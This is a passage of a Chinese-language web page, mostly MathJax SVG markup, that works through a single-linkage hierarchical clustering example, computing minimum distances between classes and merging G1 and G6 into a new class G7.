221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="10.31ex" height="2.034ex" role="img" focusable="false" viewBox="0 -705 4557 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1222.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1667.2,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2889.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(3334.4,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>之间的最短距离，为</p><script type="math/tex; mode=display">d_{61}=\min(d_{31},d_{51})=2\\d_{62}=\min(d_{32},d_{52})=5\\d_{64}=\min(d_{34},d_{54})=5</script><p><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="10.31ex" height="2.034ex" role="img" focusable="false" viewBox="0 -705 4557 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(1222.6,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(1667.2,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(2889.8,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(3334.4,0)"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>三类之间的距离从矩阵中可以看出：</p><script type="math/tex; mode=display">d_{12}=7\\d_{14}=9\\d_{24}=4</script><p>显然，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="7.112ex" height="1.945ex" role="img" focusable="false" viewBox="0 -694 3143.7 859.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1587.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(2643.7,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></svg></mjx-container>最小，所以将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.339ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.934ex" role="img" focusable="false" viewBox="0 -705 1222.6 855"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.97ex" role="img" focusable="false" viewBox="0 -705 1222.6 870.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g></g></g></svg></mjx-container>合并成一个新类，记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="16.903ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 7471.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g></g><g data-mml-node="mo" transform="translate(1500.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2556.1,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(3056.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(4064.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4509.3,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(5517.9,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(5962.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(6971.1,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>。</p><p>计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.97ex" role="img" focusable="false" viewBox="0 -705 1222.6 870.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="37" d="M55 458Q56 460 72 567L88 674Q88 676 108 676H128V672Q128 662 143 655T195 646T364 644H485V605L417 512Q408 500 387 472T360 435T339 403T319 367T305 330T292 284T284 230T278 162T275 80Q275 66 275 52T274 28V19Q270 2 255 -10T221 -22Q210 -22 200 -19T179 0T168 40Q168 198 265 368Q285 400 349 489L395 552H302Q128 552 119 546Q113 543 108 522T98 479L95 458V455H55V458Z"></path></g></g></g></g></svg></mjx-container>与<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.439ex" xmlns="http://www.w3.org/2000/svg" width="6.538ex" height="2.034ex" role="img" focusable="false" 